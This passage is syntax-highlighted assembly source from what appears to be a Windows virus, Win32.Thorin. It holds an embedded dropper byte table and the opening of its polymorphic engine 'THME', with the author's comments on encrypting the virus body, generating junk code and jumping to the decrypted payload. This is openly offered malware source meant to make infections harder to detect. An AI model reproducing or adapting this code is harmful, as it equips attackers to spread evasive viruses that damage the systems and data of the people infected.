    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">035h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">015h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">078h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Eh</span><span class="sc0">
</span><span class="sc5">dropper_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dropper</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; [THME] - The Hobbit Mutation Engine</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ› …ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›</span><span class="sc0">
</span><span class="sc1">; Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õº €€ﬂ €€€€€€€ €€   €€ ‹€€€€€€‹ ‹€€€€€€ ﬂ€€ »Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ</span><span class="sc0">
</span><span class="sc1">; ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›   €€    ﬁ€›   €€‹‹‹€€ €€ €€ €€ €€‹‹‹‹   €€   ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›</span><span class="sc0">
</span><span class="sc1">; ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›   €€    ﬁ€›   €€ﬂﬂﬂ€€ €€ €€ €€ €€ﬂﬂﬂﬂ   €€   ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›</span><span class="sc0">
</span><span class="sc1">; Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õª €€‹   ﬁ€›   €€   €€ €€ €€ €€ ﬂ€€€€€€ ‹€€ …Õ€Õ€Õ€Õ€Õ€Õ€Õ€Õ</span><span class="sc0">
</span><span class="sc1">; ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ› »ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›ﬁ›</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is a little polymorphic engine dessigned for my Win32.Thorin v1.00 vi-</span><span class="sc0">
</span><span class="sc1">; rus. It isn't very powerful, as it wasn't dessigned to be an unreachable</span><span class="sc0">
</span><span class="sc1">; engine, because the virus is enough big without poly, so i didn't wanted it</span><span class="sc0">
</span><span class="sc1">; to grow too much. It isn't my first poly engine for Win32 enviroments, but</span><span class="sc0">
</span><span class="sc1">; it is the first one i finished (and the simplest one). It is messy, unopti-</span><span class="sc0">
</span><span class="sc1">; mized, etc. But let me talk about its features:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ˘ Non-realistic code (copro used, etc)</span><span class="sc0">
</span><span class="sc1">; ˘ Able of use any register (except ESP) as Pointer, Counter, and Delta.</span><span class="sc0">
</span><span class="sc1">; ˘ Crypt operations : ADD/SUB/XOR</span><span class="sc0">
</span><span class="sc1">; ˘ Garbage generator abilities:</span><span class="sc0">
</span><span class="sc1">;   - CALLs to subroutines (can be recursive)</span><span class="sc0">
</span><span class="sc1">;   - Arithmetic operations REG32/REG32</span><span class="sc0">
</span><span class="sc1">;   - Arithmetic operations REG32/IMM32</span><span class="sc0">
</span><span class="sc1">;   - Arithmetic operations EAX32/IMM32</span><span class="sc0">
</span><span class="sc1">;   - MOV reg32,reg32/imm32</span><span class="sc0">
</span><span class="sc1">;   - MOV reg16,reg16/imm16</span><span class="sc0">
</span><span class="sc1">;   - PUSH/Garbage/POP structures</span><span class="sc0">
</span><span class="sc1">;   - Coprocessor opcodes</span><span class="sc0">
</span><span class="sc1">;   - Simple onebyters</span><span class="sc0">
</span><span class="sc1">; ˘ Encryptor fixed size, 2048 bytes.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I coded this engine in a record time ;) Pfff, maaaany improvements could be</span><span class="sc0">
</span><span class="sc1">; made, i know, but i think there will be another versions of the virus, so i</span><span class="sc0">
</span><span class="sc1">; will try to fix bugs (if any) and improve the junk generation, that is very</span><span class="sc0">
</span><span class="sc1">; weak, as well as the encryption is.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ECX = Size of code to encrypt/4</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to the data to encrypt</span><span class="sc0">
</span><span class="sc1">;       EDI = Buffer where the decryptor+encrypted virus body will go</span><span class="sc0">
</span><span class="sc1">;       EBP = Delta Offset</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       ECX = Decryptor size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       All the other registers, preserved.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">LIMIT</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">400h</span><span class="sc0">                    </span><span class="sc1">; Decryptor size</span><span class="sc0">

</span><span class="sc5">RECURSION</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">05h</span><span class="sc0">                     </span><span class="sc1">; The recursion level of THME</span><span class="sc0">

</span><span class="sc5">_EAX</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000000b</span><span class="sc0">               </span><span class="sc1">; All these are the numeric</span><span class="sc0">
</span><span class="sc5">_ECX</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000001b</span><span class="sc0">               </span><span class="sc1">; value of all the registers.</span><span class="sc0">
</span><span class="sc5">_EDX</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000010b</span><span class="sc0">               </span><span class="sc1">; Heh, i haven't used here </span><span class="sc0">
</span><span class="sc5">_EBX</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000011b</span><span class="sc0">               </span><span class="sc1">; all this, but... wtf? they</span><span class="sc0">
</span><span class="sc5">_ESP</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000100b</span><span class="sc0">               </span><span class="sc1">; don't waste bytes, and ma-</span><span class="sc0">
</span><span class="sc5">_EBP</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000101b</span><span class="sc0">               </span><span class="sc1">; ke this shit to be more</span><span class="sc0">
</span><span class="sc5">_ESI</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000110b</span><span class="sc0">               </span><span class="sc1">; clear :)</span><span class="sc0">
</span><span class="sc5">_EDI</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000111b</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">; [ PUSHAD structure ]</span><span class="sc0">

</span><span class="sc5">PUSHAD_EDI</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ESI</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EBP</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ESP</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">PUSHAD_EBX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EDX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ECX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EAX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1Ch</span><span class="sc0">

</span><span class="sc5">RETURN_ADDRESS</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc1">; [ THME_CryptOp ]</span><span class="sc0">

</span><span class="sc5">_XOR</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000001b</span><span class="sc0">               </span><span class="sc1">; XOR / XOR \
_ADD            equ     00000010b               ; ADD / SUB  &gt;  Base crypt</span><span class="sc0">
</span><span class="sc5">_SUB</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000100b</span><span class="sc0">               </span><span class="sc1">; SUB / ADD /</span><span class="sc0">

</span><span class="sc1">; mamamamamama weer creezy now...</span><span class="sc0">

</span><span class="sc6">salc</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D6h</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">THME</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_InitVariables</span><span class="sc0">              </span><span class="sc1">; Initialize poly engine</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_BunchOfShit</span><span class="sc0">                </span><span class="sc1">; Garbage!</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sTHME_Decrypt1</span><span class="sc0">              </span><span class="sc1">; Get decryptor order in its</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">                         </span><span class="sc1">; first part</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Decrypt1</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">; Generate real instruction</span><span class="sc0">
</span><span class="sc5">THME_BuildIt</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">; plus some garbage</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_BunchOfShit</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">THME_BuildIt</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_BunchOfShit</span><span class="sc0">                </span><span class="sc1">; Generate the last part of</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_StoreLoop</span><span class="sc0">                  </span><span class="sc1">; the poly</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_BunchOfShit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenCryptOperations</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_BunchOfShit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenIncPointer</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_BunchOfShit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenDecCounter</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenLoop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_BunchOfShit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                         </span><span class="sc1">; Generate the JMP to the </span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; decrypted virus code</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LIMIT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Pointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Fill with shit the rest</span><span class="sc0">
</span><span class="sc5">THME_FillTheRest</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">THME_FillTheRest</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_CryptData</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_ClosePoly</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc3">"[THME v1.00]"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">THME_InitVariables</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Pointer</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Save all given data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Data2crypt</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
